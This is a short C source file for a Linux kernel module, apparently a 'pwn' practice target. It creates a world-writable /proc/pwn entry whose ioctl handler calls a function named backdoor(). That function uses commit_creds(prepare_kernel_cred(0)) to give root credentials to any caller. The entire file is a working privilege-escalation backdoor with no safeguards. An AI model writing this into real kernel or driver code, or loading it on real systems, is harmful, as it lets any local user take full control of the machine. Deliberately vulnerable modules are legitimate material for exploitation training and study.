#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/sched.h>


struct proc_dir_entry * pwn_proc ;
void backdoor(void)
{
	commit_creds(prepare_kernel_cred(0));

}
static long pwn_ioctl(struct file *fd, unsigned int a2,unsigned long  a3)
{
	backdoor();
	return 0;
}

static struct file_operations fops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl = pwn_ioctl,
};

static int pwn_init(void) {
	pwn_proc = proc_create("pwn", 438LL, 0LL, &fops);
	return 0;
}

static void pwn_exit(void) {
	if ( pwn_proc ){
		proc_remove(pwn_proc);
	}

}

module_init(pwn_init);
module_exit(pwn_exit);

MODULE_LICENSE("GPL");


